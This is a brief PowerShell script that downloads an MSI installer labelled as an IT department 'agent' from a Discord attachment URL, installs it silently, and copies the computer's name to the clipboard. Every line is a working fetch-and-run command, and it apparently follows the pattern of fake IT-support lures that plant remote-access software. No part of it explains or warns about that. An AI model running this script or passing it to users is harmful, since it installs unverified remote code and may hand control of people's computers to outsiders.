Invoke-WebRequest -Uri "https://cdn.discordapp.com/attachments/1555972631889707039/1555975421151940619/ZA_Access_IT_Department.msi?backend=b2&ex=6acdaf49&is=6acc5dc9&hm=321cad0b120aa3f6d21b7d42904729a98675db80c9b9e87292c710f7c41347cc&" -OutFile "$env:USERPROFILE\Downloads\agent.msi"
Start-Process -FilePath "msiexec.exe" -ArgumentList "/i `"$env:USERPROFILE\Downloads\agent.msi`" /passive" -Wait

echo "Current PC Name: $env:COMPUTERNAME"
$env:COMPUTERNAME | Set-Clipboard

Read-Host -Prompt "Press Enter to continue..."
